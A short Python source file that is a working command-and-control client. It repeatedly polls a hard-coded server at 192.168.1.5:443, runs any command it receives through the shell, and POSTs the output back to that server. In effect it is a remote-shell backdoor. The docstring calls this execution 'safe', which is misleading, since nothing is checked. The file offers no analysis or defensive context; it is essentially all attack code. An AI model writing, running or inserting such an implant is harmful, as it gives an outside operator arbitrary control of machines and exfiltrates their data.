#httpclient.py


import urllib.request
import subprocess
import time

C2_SERVER = "http://192.168.1.5:443"

def execute_command(command):
    """Safely execute a command and return output"""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True
        )
        return result.stdout + result.stderr
    except:
        return "[ERROR] Command failed"

def main():
    print(f"C2 Client starting...")
    print(f"Server: {C2_SERVER}")
    
    while True:
        try:
            # Check for commands
            response = urllib.request.urlopen(C2_SERVER, timeout=10)
            command = response.read().decode().strip()
            
            if command and command != "NOOP":
                print(f"Command received: {command}")
                
                # Execute command
                output = execute_command(command)
                print(f"Output: {output[:100]}...")
                
                # Send results back
                data = output.encode()
                req = urllib.request.Request(C2_SERVER, data=data, method='POST')
                urllib.request.urlopen(req, timeout=10)
                
            time.sleep(10)
            
        except KeyboardInterrupt:
            print("Stopped")
            break
        except:
            print("Connection failed, retrying...")
            time.sleep(30)

if __name__ == "__main__":
    main()